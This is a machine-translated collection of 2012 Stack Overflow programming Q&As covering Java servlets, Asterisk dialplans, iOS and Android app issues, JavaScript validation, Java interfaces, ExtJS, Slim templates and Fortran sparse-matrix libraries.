        throws ServletException, IOException {
    response.setContentType("text/html;charset=UTF-8");
    PrintWriter out = response.getWriter();
}

@Override
protected void doGet(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {

    String status = request.getParameter("status");
    System.out.println(status);
}

@Override
protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {

    try {
        String loginId = request.getParameter("login_id");
        String password = request.getParameter("password");

        System.out.println(loginId);

        //Inserting value to the Pogo named "newLoginPogo"
        loginData newLoginPogo = new loginData();
        newLoginPogo.setLoginId(loginId);
        newLoginPogo.setPassword(password);

        //Creating a obj of ModelLogin to send the loginId and Password via a method which is in ModelLogin class
        ModelLogin loginBis = new ModelLogin();
        loginData userData = loginBis.checkUser(newLoginPogo);
        String userExist = userData.getUserExist();
        System.out.println(userExist);
        if ("yes".equals(userExist)) {
            System.out.println("In while loop of Servlet");

            String firstName = userData.getFirstName();
            String userId = userData.getUserId();
            boolean IsSu = userData.getIsSu();
            //conveting boolean to string
            String superuser = new Boolean(IsSu).toString();

            //Creating a session 

            session.setAttribute("firstName", firstName);
            session.setAttribute(userId, "userId");
            session.setAttribute(superuser, "IsSu");
            //==============================================================================================================
            //If user does exist show the Success Message and forward Dashboard 
            //==============================================================================================================

            //Session for success message
            String succmsg = "Login Successful";
            session.setAttribute("succmsg", succmsg);

            getServletConfig().getServletContext().getRequestDispatcher("/WEB-INF/ViewPages/dashboard/dashboard.jsp").forward(request, response);

        } //==============================================================================================================
        //If user does not exist show the Error Message  
        //==============================================================================================================
        else if ("no".equals(userExist)) {
            //Session for success message
            System.out.println("inside NO");
            String emsg = "Login Error";
            session.setAttribute("errmsg", emsg);
            getServletConfig().getServletContext().getRequestDispatcher("/index.jsp").forward(request, response);
        } else {
        }
        /*
        //===============================================================================================================    
        //code for Logout
        //===============================================================================================================
        String status = request.getParameter("status");
        if ("logout".equals(status)) {
            //clearing the session
            session.invalidate();
            //forwarding to index page
            getServletConfig().getServletContext().getRequestDispatcher("/index.jsp").forward(request, response);
        }
        */
    } finally {
    }
}} 
```

但它说

```
Can Not find Symbol 
```

在这一行 HttpSession session = request.getSession(true);

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:14:13.253

您不需要将 servlet 中的会话变量作为字段。一般来说 - 这是一种常见的错误。只有一个 servlet 实例服务大量请求，除非您将其声明为单线程 - 请求将同时处理。

HttpSession 将通过请求对象预先存在于 doGet 和 doPost 中。Servlet 容器将保证这一点。因此，只需在 doGet/doPost 中获取对会话的引用，然后做任何你想做的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:18:06.977

您想要的是 HTTP 会话的角色之一。
您可以将其视为客户端和服务器之间的对话。
只要“会话”（HTTP 会话）是打开的并且处于活动状态，您就可以在 HTTP 会话上设置变量，并从将在同一会话上发送的不同请求访问它们。
将此视为在“对话时间”中存在的某种“共享记忆”。
您可以在互联网上找到许多有关如何执行此操作的示例。
这是[会话跟踪](http://www.apl.jhu.edu/~hall/java/Servlet-Tutorial/Servlet-Tutorial-Session-Tracking.html)的示例。

# php - 如何在拨号方案中获取 dtmf 值

> ID：12328460
> 
> 赞同：4
> 
> 时间：2012-09-08T06:02:55.797
> 
> 标签：php, sip, asterisk

我有一个`dialplan`我想要的，如果用户按任意键然后再次播放文件，但我不明白如何在拨号计划中获取 dtmf 值。这是我的拨号方案：

```
[callme]  
exten => s,1,Answer 
exten => s,n,Playback(demo/${FILENAME1}) 
```

首先如何获取 DTMF 值，如果用户按下任何键，则播放应该执行 2 次。但我想使用`dialplan`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T13:40:09.487

您可以使用 WaitExten [1] 来做到这一点：

```
[callme]  
exten => s,1,Answer 
exten => s,n,Playback(demo/${FILENAME1})
exten => s,n,WaitExten(3)
exten => s,n,Goto(s,1)
exten => 1,1,Noop(user pressed 1)
exten => 1,n,Goto(however-shall-go-to-when-pressed-1)
exten => 2,1,Noop(user pressed 2)
exten => 2,n,Goto(however-shall-go-to-when-pressed-2) 
```

使用扩展模式 [2]：

```
[callme]  
exten => s,1,Answer 
exten => s,n,Playback(demo/${FILENAME1})
exten => s,n,WaitExten(3)
exten => s,n,Goto(s,1)
exten => X,1,Noop(user pressed ${EXTEN})
exten => X,n,Goto(however-shall-go-to-when-pressed-${EXTEN}) 
```

这正是您所要求的：

```
[callme]  
exten => s,1,Answer 
exten => s,n,Playback(demo/${FILENAME1})
exten => s,n,WaitExten(3) 
exten => s,n,NoOp(going on - no dtmf detectd)
exten => X,1,Noop(user pressed ${EXTEN})
exten => X,n,Goto(s,1) 
```

还可以查看背景星号应用程序 [3]。

参考：

[1] [http://www.voip-info.org/wiki/view/Asterisk+cmd+WaitExten](http://www.voip-info.org/wiki/view/Asterisk+cmd+WaitExten)

[2] [http://www.voip-info.org/wiki/view/Asterisk+Dialplan+Patterns](http://www.voip-info.org/wiki/view/Asterisk+Dialplan+Patterns)

[3] [http://www.voip-info.org/wiki/view/Asterisk+cmd+BackGround](http://www.voip-info.org/wiki/view/Asterisk+cmd+BackGround)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T20:37:26.887

您还可以使用应用程序读取。它确实要求不止一次，并导致更简单的拨号方案

```
[test]
;Read(variable[,filename[&filename2[&...]][,maxdigits[,options[,attempts[,timeout]]]]])
exten => s,1,Read(response,file_to_play,3,,4,10)
;will read into response variable,upto 3 digits and ask upto 4 times, timeout 10 sec

exten => s,2,GotoIf($[ "${response}" == "123"]?pin_ok,s,1) 
```

[有关在 voip-info.org 上阅读的完整信息](http://www.voip-info.org/wiki/view/Asterisk+cmd+Read)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-10T06:00:27.657

感谢您回复我的解决方案，但我得到了这个解决方案，它对我有用......

```
[callme]
exten => s,1,Answer
exten => s,n,DumpChan()
exten => s,n,Playback(sclbrd/welcome)
exten => s,n,Wait(2)
exten => s,n,Set(i=1)
exten => s,n,While($[${i} != 3])
exten => s,n,Playback(sclbrd/${FILENAME1})
exten => s,n,Read(digit|sclbrd/press|1)
exten => s,n,Wait(1)
exten => s,n,GotoIf($["${digit}x" = "x"]?done:again)
exten => s,n(again),Wait(1)
exten => s,n,Set(i=$[${i} + 1])
exten => s,n,EndWhile()
exten => h,n(done),Wait(1) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-12-14T09:00:34.583

这是读取 DTMF 值的简单示例上下文

```
[readDTMF]
exten => 113,1,Answer()
same  => n,Read(NUMBER,vm-toenternumber)
same  => n,Verbose(${NUMBER})
same  => n,SayNumber(${NUMBER})
same  => n,Hangup() 
```

读取（变量到存储读取编号，[文件名到播放前读取][，其他选项]）

*   参考1： [https ://wiki.asterisk.org/wiki/display/AST/Asterisk+13+Application_Read](https://wiki.asterisk.org/wiki/display/AST/Asterisk+13+Application_Read)
*   参考2：[http ://www.voip-info.org/wiki/view/Asterisk+cmd+Read](http://www.voip-info.org/wiki/view/Asterisk+cmd+Read)

# xcode - 使用最新 Facebook iOS SDK 的设备上的应用程序崩溃

> ID：12328461
> 
> 赞同：0
> 
> 时间：2012-09-08T06:02:57.853
> 
> 标签：xcode, ios4, facebook-ios-sdk

我的应用程序可以在模拟器中正确编译和运行，但在我的设备上运行时却不行。我正在使用最新的 Facebook SDK 版本。我正在使用 XCode 3.2.6、LLVM 编译器 1.7 并在运行 iOS 4.3.5 的设备 iPhone 4 上进行测试。我收到以下错误：

```
Program received signal:  “SIGSYS”.
warning: Unable to read symbols for /Developer/Platforms/iPhoneOS.platform/DeviceSupport/4.3.5 (8L1)/Symbols/Developer/usr/lib/libXcodeDebuggerSupport.dylib (file not found).
Xcode could not locate source file: FBSettings.m (line: 65)
(gdb) bt
#0  0x00080324 in __33+[FBSettings autoPublishInstall:]_block_invoke_0 (.block_descriptor=0x4e) at /Users/jacl/src/ship/ios-sdk/src/FBSettings.m:65
#1  0x336226aa in dispatch_once$VARIANT$up ()
#2  0x0008031c in +[FBSettings autoPublishInstall:] (self=0x4e, _cmd=0x2fdfdc48, appID=<value temporarily unavailable, due to optimizations>) at once.h:68
#3  0x00077d48 in -[FBSession initWithAppID:permissions:urlSchemeSuffix:tokenCacheStrategy:] (self=<value temporarily unavailable, due to optimizations>, _cmd=0x2fdfdc48, appID=<value temporarily unavailable, due to optimizations>, permissions=<value temporarily unavailable, due to optimizations>, urlSchemeSuffix=<value temporarily unavailable, due to optimizations>, tokenCachingStrategy=<value temporarily unavailable, due to optimizations>) at /Users/jacl/src/ship/ios-sdk/src/FBSession.m:244
#4  0x00077950 in -[FBSession init] (self=<value temporarily unavailable, due to optimizations>, _cmd=<value temporarily unavailable, due to optimizations>) at /Users/jacl/src/ship/ios-sdk/src/FBSession.m:153
#5  0x0007877e in +[FBSession activeSession] (self=<value temporarily unavailable, due to optimizations>, _cmd=<value temporarily unavailable, due to optimizations>) at /Users/jacl/src/ship/ios-sdk/src/FBSession.m:446
#6  0x0002d704 in -[FacebookClient initWithContext:andDocumentsPath:] (self=0x2ae5a0, _cmd=0x9259c, context=0x2bb1b0, path=0x28b0b0) at /Users/username/projects/myapp/myapp-ios/Classes/FacebookClient.m:84
#7  0x00003586 in -[MyAppDelegate application:didFinishLaunchingWithOptions:] (self=0x28be00, _cmd=0x3587dbfe, application=0x263f40, launchOptions=0x0) at /Users/username/projects/myapp/myapp-ios/Classes/MyAppDelegate.m:234
#8  0x355c1820 in -[UIApplication _callInitializationDelegatesForURL:payload:suspended:] ()
#9  0x355bbb64 in -[UIApplication _runWithURL:payload:launchOrientation:statusBarStyle:statusBarHidden:] ()
#10 0x355907d6 in -[UIApplication handleEvent:withNewEvent:] ()
#11 0x35590214 in -[UIApplication sendEvent:] ()
#12 0x3558fc52 in _UIApplicationHandleEvent ()
#13 0x35ecae76 in PurpleEventCallback ()
#14 0x3677da96 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION__ ()
#15 0x3677f83e in __CFRunLoopDoSource1 ()
#16 0x3678060c in __CFRunLoopRun ()
#17 0x36710ec2 in CFRunLoopRunSpecific ()
#18 0x36710dca in CFRunLoopRunInMode ()
#19 0x355bad48 in -[UIApplication _run] ()
#20 0x355b8806 in UIApplicationMain ()
#21 0x00002858 in main (argc=1, argv=0x2fdff488) at /Users/username/projects/myapp/myapp-ios/main.m:14 
```

引用的代码（FBSettings.m 第 65 行）似乎不是特别成问题：

```
+ (void)autoPublishInstall:(NSString *)appID {
    if ([FBSettings shouldAutoPublishInstall]) {
        dispatch_once(&g_publishInstallOnceToken, ^{
            // dispatch_once is great, but not re-entrant.  Inside publishInstall we use FBRequest, which will
            // cause this function to get invoked a second time.  By scheduling the work, we can sidestep the problem.
            [[FBSettings class] performSelector:@selector(publishInstall:) withObject:appID afterDelay:FBPublishDelay];
        });
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T21:40:43.790

我有这个崩溃是因为我在设备上安装的另一个测试应用程序中使用了相同的 FacebookAppID。一旦我删除了另一个应用程序，我就不再遇到这个崩溃了。

# android - 如何在 Android 中为非市场应用程序更新应用程序而不是替换应用程序

> ID：12328462
> 
> 赞同：2
> 
> 时间：2012-09-08T06:02:58.050
> 
> 标签：android, background, notifications, updates

提前感谢您阅读查询。

我正在尝试将我的应用程序从较低版本更新到较高版本。由于我的应用程序不在市场上，所以我想从我的网络服务更新。

我想要的是 ？

我想在后台静默更新我的应用程序，无需用户干预。如果这是不可能的，请以最少的用户干预（就像 Google Play 更新）更新应用程序并通知更新应用程序而不是替换应用程序。

我做了什么？

我试图通过以下方式更新我的应用程序

旧应用程序 Android Manifest

```
android:versionCode="1"
android:versionName="1.0" 
```

新应用程序 Android 清单

```
android:versionCode="2"
android:versionName="1.1" 
```

安装新更新的代码

```
Uri packageURI = Uri.parse(packageName.toString());
Intent intent = new Intent(android.content.Intent.ACTION_VIEW, packageURI);
intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory() + "/download/"  + ApkName.toString())),"application/vnd.android.package-archive"); 
```

我得到什么？

1.  我无法在后台静默更新应用程序。
2.  在安装更新时，我得到了替换应用程序而不是更新应用程序。

感谢和问候克里希纳诉马哈迪克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:28:38.793

ok 使用可以使用 GCM 服务来通知用户更新

这是链接[http://developer.android.com/guide/google/gcm/index.html](http://developer.android.com/guide/google/gcm/index.html)

并且每当您更新应用程序时，它都会安装新版本，保持应用程序设置不变。这件事我已经检查过了

# javascript - 输入为空时如何停止发送

> ID：12328471
> 
> 赞同：0
> 
> 时间：2012-09-08T06:04:43.913
> 
> 标签：javascript, css, forms, input

我如何停止发送表单联系人并显示消息以填写输入

我使用文本输入及其在 jquery 消息中的显示，如 facebox

我用这个代码

在头

```
 <script type="text/javascript">
    function checkForm(form) {
        var nameCheck = checkName(form.elements['name']),
            mailCheck = checkMail(form.elements['email']),
            phoCheck = checkPho(form.elements['phone']),
            msgCheck = checkMsg(form.elements['msg']);
        return nameCheck && mailCheck && phoCheck && msgCheck;
    }

    function checkName(input) {
        var check = input.value.length >= 30;
        input.style.borderColor = check ? 'black' : 'red';
        return check;
    }

    function checkMail(input) {
        var check = input.value.indexOf('@') >= 0;
        input.style.borderColor = check ? 'black' : 'red';
        return check;
    }

    function checkPho(input) {
        var check = input.value.length >= 5 && input.value !== 'رقم الهاتف';
        input.style.borderColor = check ? 'black' : 'red';
        return check;
}
    function checkMsg(textarea) {
        var check = textarea.value.length >= 500;
        textarea.style.borderColor = check ? 'black' : 'red';
        return check;
    }
    </script> 
```

在体内

```
<form id="formsend" action="form.php" method="post" onsubmit="return checkForm(this)">
                                    <input name="name" type="text" value="اسمك الكريم" id="name" onblur="if (this.value=='')this.value='اسمك الكريم'" onclick="value=''" onkeyup="checkName(this)" />
                                    <br />
                                    <input name="email" type="text" id="email" value="البريد الالكتروني" onblur="if (this.value=='')this.value='البريد الالكتروني'" onclick="value=''" onkeyup="checkMail(this)" />
                                                        <br />
                                    <input name="phone" type="text" id="phone" value="رقم الهاتف" onblur="if (this.value=='')this.value='رقم الهاتف'" onclick="value=''" onkeyup="checkPho(this)" />
                                                        <br />
                                                        <textarea name="msg" cols="39" rows="5" placeholder="نص الرساله" onkeyup="checkMsg(this)" wrap=soft></textarea>
                                                        <br />
                                                        <input type="submit" value="ارسال" id="submit" />
                                    </form> 
```

但它只适用于电子邮件

我有 4 个输入（姓名、电子邮件、电话、味精）

有人可以告诉我我需要编辑什么或了解我可以用它做什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:09:50.887

您应该在 javascript 中添加检查，以查看姓名、电子邮件、电话和 msg 的值是否等于默认值。它现在可能正在提交表单，因为电话字段默认为 رقم الهاتف，这似乎大于 5 个字符。

编辑：这是一个例子：

```
function checkPho(input) {
    var check = input.value.length >= 5 && input.value !== 'رقم الهاتف';
    input.style.borderColor = check ? 'black' : 'red';
    return check;
} 
```

# java - 如何扩展接口

> ID：12328475
> 
> 赞同：8
> 
> 时间：2012-09-08T06:05:19.733
> 
> 标签：java, design-patterns, inheritance, interface

我正在编码接口。

我有一个接口**A**和一个实现它的类**B。**

有人告诉我，我可以通过用**C扩展 B 来覆盖****B 的**功能，但我被要求既不触及**B**也不触及**C**，然后在配置文件中将**B**替换为**C**作为**A的实现类。**

 ********我想我需要一个在A**中不可用的方法，所以我需要向**A**添加一个可以在**C**中实现的方法。但我不允许触摸**A**。

有人可以帮我解决怎么做吗？

谢谢。

**编辑**： **示例代码：**

**爪哇**

```
public interface A {
    void X();
    void Y();
} 
```

**B.java**

```
public class B implements A {
    public void X() {//something interesting}
    public void Y() {//something not very interesting}
} 
```

现在因为我不被允许触摸，`A`或者`B`我不得不编写另一个类`C`并将其从 B 扩展来做我的事情。

**C.java**

```
public class C extends B {
    public void Y() {//overriding B's not very interesting Y and making it interesting}
} 
```

现在我需要 **C.java**中的另一个方法来做我的事情，但是因为如果我`void Z()`在**C.java**上添加一个方法同时使用引用变量我将无法调用，所以我必须在接口中声明为像那样使用它很好，但如果我这样做，我将不得不触摸我不允许触摸的东西。所以如何解决这个问题是我一直想问的。**`A`**`A's``Z()``void Z()``A``A`****

 ****所以本质上，我将无法执行以下操作：

```
A a = new C();
a.Z(); //can't do this 
```

那么有什么方法可以让我在不触及 A 或 B 的情况下实现这样的目标吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-08T08:47:18.960

我想我明白你想要什么。您有以下内容：

```
public interface A {
  // can't touch this
}

public class B implements A {
  // can't touch this
}

public class C extends B {
  // you want to add your own method
  void someNewMethod();
}

// And you wish to do this:
A foo = new C();
foo.someNewMethod(); 
```

如果这是你想要的，那恐怕是做不到的。任何与之合作的人`A`都只知道 ; 中定义的方法`A`。他们不会知道你已经`someNewMethod()`在课堂上定义了`C`。你需要被允许改变`A`。

请注意，在极端情况下，您可以检查以下实例的类类型`A`：

```
A foo;
// ...

if (foo instanceof C) {
  ((C) foo).someNewMethod();
} 
```

但这*真的很丑陋*，并且违反了 OO 编程的许多基本规则。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T19:00:00.103

我不知道你是否被允许这样做，但你可以扩展接口和类，你可以这样做：

公共接口 A2 扩展 A { public void mySuperVeryInterestingNewMethod(); }

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T06:07:55.773

所以，根据你刚才写的，你不能碰A，B，也不能碰C……所以，用D扩展C？

然后你可以添加你需要/想要的任何方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T06:49:28.350

你的问题根本不清楚。这是你的意思还是你想要的？

```
public interface InterfaceA
{

}

public class ClassB implements InterfaceA
{

}

public class ClassC extends ClassB
{

}

public class ClassD extends ClassC
{

}

public class Main
{
    protected InterfaceA A;

    public Main()
    {
        //A = new ClassB();
        A = new ClassD();
    }

    public static void main(String[]args)
    {
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-08T07:47:11.740

如果该方法支持，则无需将其添加到接口来​​实现它。如果它在其他地方使用，则 B 实现另一个接口 D。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-09-30T11:35:16.077

这可能会解决您的问题：

```
package test;

public interface A {

    void X();
    void Y();

}

package test;

public class B implements A{

    @Override
    public void X() {

        System.out.println("Something X");

    }

    @Override
    public void Y() {

        System.out.println("Something Y");
    }

}

package test;

public class C extends B implements A{

    public static void main(String[] args) {

        A a=new C();
        a.X();
        a.Y();

    }

} 
```

根据您的要求

1-您已经创建了一个接口 A。

2-创建了一个实现A的类B。

3-创建了一个扩展 B 并实现 A 的类 C。

4- A a=new C() 将创建 A 类型的引用变量，但在运行时它将保存 C 的对象。

由于您不能触摸 B 和 C，因此签名是相同的，并且您使用 C 的对象从 B 调用 X() 和 Y()，因为它扩展了 B。

因此，您已经用 C 替换了 B，而没有在 C 中实现 X 和 Y 并对 B 进行更改。

输出 ：

```
Something X
Something Y 
```

希望这能回答你的问题。**********

# javascript - 用 Extjs 定义函数

> ID：12328480
> 
> 赞同：0
> 
> 时间：2012-09-08T06:06:09.557
> 
> 标签：javascript, extjs, web

我正在尝试 Extjs 书的示例之一。我想定义一个函数来显示消息并运行该函数，所以我复制了以下代码，但它不起作用。这有什么问题？！

```
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" type="text/css" href="extjs/resources/css/ext-all.css" />
        <script src="extjs/adapter/ext/ext-base.js"></script>
        <script src="extjs/ext-all-debug.js"></script>
        <script>
            Function stapler(){
                Ext.Msg.show({
                    title: 'Milton',
                    msg: 'Have you seen my stapler?',
                    buttons: {
                        yes: true,
                        no: true,
                        cancel: true
                    }
                });
            }
            Ext.onReady(stapler());
        </script>
        <title>JSP Page</title>
    </head>
    <body>
        <h1>Hello World!</h1>

        <h1>Good Bye World!</h1>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:09:48.480

**1.**`Function`应该是小写`function`。

**2.**`Ext.onReady`应该把一个函数作为回调，而不是函数的结果。

`Ext.onReady(stapler());`应该`Ext.onReady(stapler);`

# ruby-on-rails - -if-else 语句中的 Slim 错误

> ID：12328481
> 
> 赞同：1
> 
> 时间：2012-09-08T06:06:11.133
> 
> 标签：ruby-on-rails, if-statement, slim-lang

在[这个要点](https://gist.github.com/3672209)中，我在一个苗条文件中放置了一个错误，当我取消注释所有以下内容时，该错误消失`- else`：

```
= link_to "Spm", root_path, :class => 'brand'
ul.nav.pull-right
  li.dropdown
    - if user_signed_in?
      a#drop.dropdown-toggle href='#' role='button' data-toggle='dropdown' = current_user.name
        b.caret
      ul.dropdown-menu role='menu' aria-labelledby='drop'
        li = link_to 'Logout', destroy_user_session_path, :method=>'delete'
        li = link_to 'Edit account', edit_user_registration_path
        - if current_user.has_role? :admin
          li = link_to 'Admin', users_path

    - else
      / a#drop.dropdown-toggle href='#' role='button' data-toggle='dropdown' = current_user.name
      /   b.caret
      / ul.dropdown-menu role='menu' aria-labelledby='drop'
      /   li = link_to 'Login', new_user_session_path
      /   li = link_to 'Sign up', new_user_registration_path 
```

没有标签，我检查了 10 次。我查了一下没有`- end`声明，所以不知道是什么问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T14:13:51.460

问题是与同一行及`b.caret`以下内容的链接：

```
 a#drop.dropdown-toggle href='#' role='button' data-toggle='dropdown'
    = current_user.name
    b.caret 
```

这很好用。

# fortran - 用于稀疏矩阵的 Fortran 90/95 库？

> ID：12328482
> 
> 赞同：16
> 
> 时间：2012-09-08T06:06:43.713
> 
> 标签：fortran, sparse-matrix, fortran90, blas, fortran95

我正在寻找一个在 fortran 90/95 中处理稀疏矩阵的库。我只需要非常基本的操作，比如矩阵向量乘法。你建议我用什么？

我搜索了一个名为“sparse blas”的 BLAS 扩展（？），记录在爆炸技术论坛规范的第 3 章中：

[http://www.netlib.org/blas/blast-forum/](http://www.netlib.org/blas/blast-forum/) ,

似乎很理想。根据该文档，该库应该有一个 fortran 95 接口。但是，我无法在可以下载的任何地方找到该规范的实际实现。我的印象是，fortran 95 sparse blas 规范并没有真正在任何地方实现？反正不是开源的。

我还找到了一个名为 sparsekit 的库：

[http://people.sc.fsu.edu/~jburkardt/f_src/sparsekit/sparsekit.html](http://people.sc.fsu.edu/~jburkardt/f_src/sparsekit/sparsekit.html)

任何人都对这两者中的任何一个或任何其他用于 fortran 90/95 的稀疏矩阵库有任何经验吗？我想就使用哪一个以及在哪里获得它的建议（在 sparsekit 的情况下，源代码可通过上述链接获得）。稀疏矩阵是否有“标准”之类的东西，例如 BLAS 用于密集矩阵？

干杯，

阿恩

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-11T22:43:18.347

好的，我将部分回答我自己的问题：

上面的@alexurba 提供了在哪里可以找到 Sparse BLAS 的完整 f95 实现：

[http://www.netlib.org/toms/818](http://www.netlib.org/toms/818)

就是这样！该脚本在您运行它的文件夹中创建所有源代码（我以前从未见过以这种方式提供的软件）。

为了使 INSTALL 脚本工作，我需要做一些更改：安装说明告诉您编辑 INSTALL 脚本并选择适当的“arch”。您的选择是：AIX、ALPHA、CRAY、HP、NAG、SGI 和 SUN。这些对我来说似乎都不合适，因为我使用的是 linux，而我在这台计算机上唯一的 fortran 编译器是 gfortran。我不太明白这个选项的目的，但我所做的工作如下：

1) 在 INSTALL 中，通过设置变量 SB_ARCH='GNU' 来组成一个我称为 GNU 的新“拱门”。2) 在 SOFTWARE/Makefile 中将 FC = f90 更改为 FC = gfortran，3) 在 TESTER/ 中将文件 Makefile.NAG 复制到 Makefile.GNU，将 FC = f90 更改为 FC = gfortran，并更改单词“NAG”的所有实例'到'GNU'。（您可能还想更改 Makefile 中的 FFLAGS 选项。）

在此之后，我运行 INSTALL，然后运行 ​​TESTER/test_all，测试吐出“0.000 ...”作为错误，我认为这意味着一切正常。

我必须说我发现找到这个源代码异常困难。幸运的是，当现在搜索“fortran 90 稀疏矩阵库”时，这个帖子在谷歌上的排名很高。

我的最终解决方案：具有讽刺意味的是，在最终找到 Sparse BLAS 的完整实现之后，我决定对于我的问题最好使用更直接的方法，因为我可能需要的只是矩阵向量乘法：找出什么稀疏矩阵要使用的表示（压缩稀疏行（CSR）似乎适合我的问题），从 Sparse BLAS 源代码中挖掘出相应的矩阵向量乘法例程，看看它希望它如何输入，然后直接在我的代码中使用它.

# android - 如何解决 classNotFoundException？

> ID：12328487
> 
> 赞同：-2
> 
> 时间：2012-09-08T06:07:50.843
> 
> 标签：android

我已经在某些站点下载了一些示例程序并尝试执行该程序。那时我没有找到类异常。我试图以多种方式解决该错误。但我无法得到解决方案。

```
 public class DataBaseDemoActivity extends Activity {
   /** Called when the activity is first created. */
SQLiteDatabase db;
Button btnInsert;

     @Override
    public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    btnInsert=(Button)findViewById(R.id.button1);

    try{

    db=openOrCreateDatabase("StudentDB",SQLiteDatabase.CREATE_IF_NECESSARY,null);

    db.execSQL("Create Table Temp(id integer,name text)");

    }catch(SQLException e)
    {

    }

    btnInsert.setOnClickListener(new View.OnClickListener() {

        public void onClick(View v) {

            EditText eid=(EditText) findViewById(R.id.edit1);
            EditText ename=(EditText)findViewById(R.id.edit2);

            ContentValues values=new ContentValues();
            values.put("id", eid.getText().toString());
            values.put("name", ename.getText().toString());
            if((db.insert("temp", null, values))!=-1)
            {
Toast.makeText(DataBaseDemoActivity.this, "Record       Successfully Inserted", 2000).show();
            }
            else
            {
Toast.makeText(DataBaseDemoActivity.this, "Insert Error", 2000).show();
            }
            eid.setText("");
            ename.setText("");

            Cursor c=db.rawQuery("SELECT * FROM temp",null);

            c.moveToFirst();
            while(!c.isAfterLast())
            {
           Toast.makeText(  DataBaseDemoActivity.this,c.getString(0)+ " "+c.getString(1), 1000).show();
                c.moveToNext();
            }
            c.close();
        }
    });
   }

   @Override
    protected void onStop() {

    db.close();
    super.onStop();
    }

    } 
```

日志猫：

```
 09-08 11:15:09.841: E/AndroidRuntime(932): FATAL EXCEPTION: main
     09-08 11:15:09.841: E/AndroidRuntime(932): java.lang.RuntimeException: Unable to    instantiate activity                        
   ComponentInfo{com.example.databasedemo/com.example.databasedemo.MainActivity}:                                  java.lang.ClassNotFoundException: com.example.databasedemo.MainActivity
     09-0 8 11:15:09.841: E/AndroidRuntime(932):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1983)
     09-08 11:15:09.841: E/AndroidRuntime(932):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2084)
      09-08 11:15:09.841: E/AndroidRuntime(932):    at android.app.ActivityThread.access$600(ActivityThread.java:130)
      09-08 11:15:09.841: E/AndroidRuntime(932):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1195)
     09-08 11:15:09.841: E/AndroidRuntime(932):     at android.os.Handler.dispatchMessage(Handler.java:99)
      09-08 11:15:09.841: E/AndroidRuntime(932):    at android.os.Looper.loop(Looper.java:137)
      09-08 11:15:09.841: E/AndroidRuntime(932):    at android.app.ActivityThread.main(ActivityThread.java:4745)
     09-08 11:15:09.841: E/AndroidRuntime(932):     at java.lang.reflect.Method.invokeNative(Native Method)
     09-08 11:15:09.841: E/AndroidRuntime(932):     at java.lang.reflect.Method.invoke(Method.java:511)
       09-08 11:15:09.841: E/AndroidRuntime(932):   at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
    09-08 11:15:09.841: E/AndroidRuntime(932):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
    09-08 11:15:09.841: E/AndroidRuntime(932):  at dalvik.system.NativeStart.main(Native Method)
    09-08 11:15:09.841: E/AndroidRuntime(932): Caused by: java.lang.ClassNotFoundException: com.example.databasedemo.MainActivity
     09-08 11:15:09.841: E/AndroidRuntime(932):     at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:61)
     09-08 11:15:09.841: E/AndroidRuntime(932):     at java.lang.ClassLoader.loadClass(ClassLoader.java:501)
     09-08 11:15:09.841: E/AndroidRuntime(932):     at java.lang.ClassLoader.loadClass(ClassLoader.java:461)
     09-08 11:15:09.841: E/AndroidRuntime(932):     at android.app.Instrumentation.newActivity(Instrumentation.java:1053)
      09-08 11:15:09.841: E/AndroidRuntime(932):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1974)
      09-08 11:15:09.841: E/AndroidRuntime(932):    ... 11 more 
```

主.XML：

```
 <?xml version="1.0" encoding="UTF-8"?>
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
  android:orientation="vertical" 
  android:layout_width="fill_parent"
 android:layout_height="fill_parent">
 <TextView 
     android:layout_width="fill_parent"
      android:layout_height="wrap_content"
       android:text="@string/hello"/>
 <TextView 
android:id="@+id/textView1" 
android:textAppearance="?android:attr/textAppearanceMedium"
 android:layout_height="wrap_content" 
 android:layout_width="wrap_content" 
 android:text="@string/si" 
 android:layout_marginTop="20dp"/>
 <EditText 
     android:id="@+id/edit1"
      android:layout_height="wrap_content"
       android:layout_width="match_parent" 
       android:inputType="number" 
       android:hint="@string/esi"
        >

        <requestFocus android:layout_width="wrap_content" />

        </EditText>
        <TextView 
            android:id="@+id/textView2" 
            android:textAppearance="?android:attr/textAppearanceMedium" 
            android:layout_height="wrap_content"
             android:layout_width="wrap_content"
              android:text="@string/sn"/>
        <EditText 
            android:id="@+id/edit2"
             android:layout_height="wrap_content"
              android:layout_width="match_parent" 
              android:hint="@string/esn"/>

        <Button
            android:id="@+id/button1"
